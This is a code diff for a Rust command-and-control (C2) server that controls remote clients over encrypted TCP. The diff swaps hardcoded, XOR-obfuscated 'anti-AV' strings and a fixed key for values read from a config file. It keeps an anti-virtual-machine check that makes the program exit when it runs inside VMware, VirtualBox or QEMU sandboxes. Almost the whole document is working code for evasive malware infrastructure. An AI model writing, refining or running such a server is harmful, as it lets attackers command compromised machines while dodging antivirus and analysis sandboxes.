@@ -10,45 +10,46 @@ use aes_gcm::{Aes256Gcm, Key, Nonce};
 use aes_gcm::aead::{Aead, KeyInit};
 use rand::Rng;use std::io::Write;
 use std::fs;
-// Encrypted strings for anti-AV
+use toml;
+use hex;
 
-const ENCRYPTION_KEY: [u8; 32] = [
-    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
-    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
-    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
-    0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
-];
-
-const XOR_KEY: u8 = 0xAA;
-
-const LISTENING_MSG_ENCRYPTED: [u8; 32] = [233,152,138,225,207,192,196,207,192,138,182,179,189,190,207,184,179,184,177,138,187,184,138,186,187,192,190,138,113,114,113,114];
-const CLIENT_CONNECTED_MSG_ENCRYPTED: [u8; 19] = [233,182,179,207,184,190,138,155,157,138,175,187,184,184,207,175,190,207,204];
-const CLIENT_DISCONNECTED_ENCRYPTED: [u8; 22] = [233,182,179,207,184,190,138,155,157,138,204,179,189,175,187,184,184,207,175,190,207,204];
-
-fn decrypt_string(encrypted: &[u8]) -> String {
-    encrypted.iter().map(|&b| (b ^ XOR_KEY) as char).collect()
+#[derive(Deserialize)]
+struct Config {
+    server: ServerConfig,
+    security: SecurityConfig,
 }
 
+#[derive(Deserialize)]
+struct ServerConfig {
+    port: u16,
+}
+
+#[derive(Deserialize)]
+struct SecurityConfig {
+    encryption_key: String,
+}
+
+fn load_config() -> Config {
+    let content = std::fs::read_to_string("config.toml").expect("Failed to read config.toml");
+    toml::from_str(&content).expect("Failed to parse config")
+}
 fn is_vm() -> bool {
-    #[cfg(windows)]
-    {
-        use winreg::RegKey;
-        use winreg::enums::HKEY_LOCAL_MACHINE;
-        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
-        if let Ok(key) = hklm.open_subkey("HARDWARE\\DESCRIPTION\\System") {
+    use winreg::RegKey;
+    use winreg::enums::HKEY_LOCAL_MACHINE;
+    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
+    if let Ok(key) = hklm.open_subkey("HARDWARE\\DESCRIPTION\\System") {
         if let Ok(bios) = key.get_value::<String, _>("SystemBiosVersion") {
-                if bios.contains("VMware") || bios.contains("VirtualBox") || bios.contains("QEMU") {
-                    return true;
-                }
+            if bios.contains("VMware") || bios.contains("VirtualBox") || bios.contains("QEMU") {
+                return true;
             }
         }
     }
     false
 }
 
-fn encrypt(data: &[u8]) -> Vec<u8> {
-    let key = Key::<Aes256Gcm>::from_slice(&ENCRYPTION_KEY);
-    let cipher = Aes256Gcm::new(&key);
+fn encrypt(data: &[u8], key: &[u8;32]) -> Vec<u8> {
+    let key_slice = Key::<Aes256Gcm>::from_slice(key);
+    let cipher = Aes256Gcm::new(&key_slice);
     let nonce_bytes = rand::thread_rng().gen::<[u8; 12]>();
     let nonce = Nonce::from_slice(&nonce_bytes);
 
@@ -58,12 +59,12 @@ fn encrypt(data: &[u8]) -> Vec<u8> {
     result
 }
 
-fn decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
+fn decrypt(data: &[u8], key: &[u8;32]) -> Result<Vec<u8>, String> {
     if data.len() < 12 {
         return Err("Data too short".to_string());
     }
-    let key = Key::<Aes256Gcm>::from_slice(&ENCRYPTION_KEY);
-    let cipher = Aes256Gcm::new(&key);
+    let key_slice = Key::<Aes256Gcm>::from_slice(key);
+    let cipher = Aes256Gcm::new(&key_slice);
     let (nonce_bytes, ciphertext) = data.split_at(12);
     let nonce = Nonce::from_slice(nonce_bytes);
 
@@ -94,13 +95,13 @@ struct Client {
     stream: TcpStream,
 }
 
-async fn handle_client(mut client: Client, mut rx: mpsc::Receiver<Command>) {
+async fn handle_client(mut client: Client, mut rx: mpsc::Receiver<Command>, encryption_key: &[u8;32]) {
     let mut buf = [0u8; 4096];
     loop {
         tokio::select! {
             Some(cmd) = rx.recv() => {
                 let data = serde_json::to_vec(&cmd).unwrap();
-                let encrypted = encrypt(&data);
+                let encrypted = encrypt(&data, encryption_key);
                 if client.stream.write_all(&encrypted).await.is_err() {
                     break;
                 }
@@ -109,7 +110,7 @@ async fn handle_client(mut client: Client, mut rx: mpsc::Receiver<Command>) {
                 match result {
                     Ok(0) => break,
                     Ok(n) => {
-                        if let Ok(decrypted) = decrypt(&buf[..n]) {
+                        if let Ok(decrypted) = decrypt(&buf[..n], encryption_key) {
                             if let Ok(resp) = serde_json::from_slice::<Response>(&decrypted) {
                                 match resp {
                                     Response::Success(msg) => println!("Client {}: {}", client.id, msg),
@@ -139,7 +140,7 @@ async fn handle_client(mut client: Client, mut rx: mpsc::Receiver<Command>) {
             }
         }
     }
-    println!("{}", decrypt_string(&CLIENT_DISCONNECTED_ENCRYPTED).replace("{}", &client.id.to_string()));
+    println!("Client {} disconnected", client.id);
 }
 
 #[tokio::main]
@@ -154,8 +155,13 @@ async fn main() {
     if is_vm() {
         std::process::exit(0);
     }
-    println!("{}", decrypt_string(&LISTENING_MSG_ENCRYPTED));
-    let listener = TcpListener::bind("0.0.0.0:7878").await.unwrap();
+    let config = load_config();
+    let port = config.server.port;
+    let key_str = config.security.encryption_key;
+    let mut encryption_key = [0u8; 32];
+    hex::decode_to_slice(&key_str, &mut encryption_key).expect("Invalid key");
+    println!("C2 Server listening on port {}", port);
+    let listener = TcpListener::bind(format!("0.0.0.0:{}", port)).await.unwrap();
     let clients: Arc<Mutex<HashMap<usize, mpsc::Sender<Command>>>> = Arc::new(Mutex::new(HashMap::new()));
     let clients_clone = clients.clone();
     tokio::spawn(async move {
@@ -165,12 +171,12 @@ async fn main() {
     while let Ok((stream, _)) = listener.accept().await {
         let id = client_id;
         client_id += 1;
-        println!("{}", decrypt_string(&CLIENT_CONNECTED_MSG_ENCRYPTED).replace("{}", &id.to_string()));
+        println!("Client {} connected", id);
         let (tx, rx) = mpsc::channel(100);
         clients.lock().await.insert(id, tx);
         let client = Client { id, stream };
         tokio::spawn(async move {
-            handle_client(client, rx).await;
+            handle_client(client, rx, &encryption_key).await;
         });
     }
 }
